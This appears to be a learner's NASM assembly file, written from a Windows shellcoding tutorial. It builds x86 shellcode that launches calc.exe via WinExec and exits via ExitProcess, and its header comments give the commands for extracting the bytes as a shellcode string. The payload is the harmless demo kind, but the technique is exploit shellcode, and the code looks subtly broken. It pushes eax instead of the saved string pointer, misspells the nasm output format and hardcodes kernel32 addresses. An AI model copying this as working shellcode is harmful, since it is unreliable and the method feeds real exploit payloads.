; run calc.exe and exit normal
; author: Chris5011
; date: 14. Nov 2022
; from: https://cocomelonc.github.io/tutorial/2021/10/27/windows-shellcoding-1.html
; nasm -f lef32 -o shellcode.o shellcode.asm
; ld -m elf_i386 -o shellcode.exe shellcode.o
; objdump -M intel -d shellcode.exe
; objdump -M intel -d shellcode.exe | grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
; 32-bit linux exe --> Works in windows as ShellCode


section .data
				
section .bss
				
section .text
	global _start	 	    ; must be declared for linker
				
_start:
	xor ecx, ecx		    ; Zero out ecx
	push ecx		        ; String-Terminator
	push 0x6578652e		    ; Push exe.
	push 0x636c6163		    ; Push clac

	mov ebx, esp		    ; save the pointer to "calc.exe" string in ebx
				
	; UINT WinExec([in] LPCSTR lpCmdLine, [in] UINT   uCmdShow);
	inc ecx			        ; uCmdShow = 1
	push ecx		        ; uCmdShow *ptr to stack on pos 2
	push eax		        ; lpCmdLine *ptr to stack on pos 1 (LIFO)
	mov ebx, 0x76d1f52e		; move and call WinExec() function on current Address in Kernel32.dll
	call ebx				;
				
	; void ExitProcess([in] UINT uExitCode);
	xor eax, eax		    ; Zero out eax
	push eax		        ; push NULL
	mov eax, 0x76cebe8a		; move and call ExitProcess() function on current Address in Kernel32.dll
	jmp eax			        ; execute the ExitProcess() function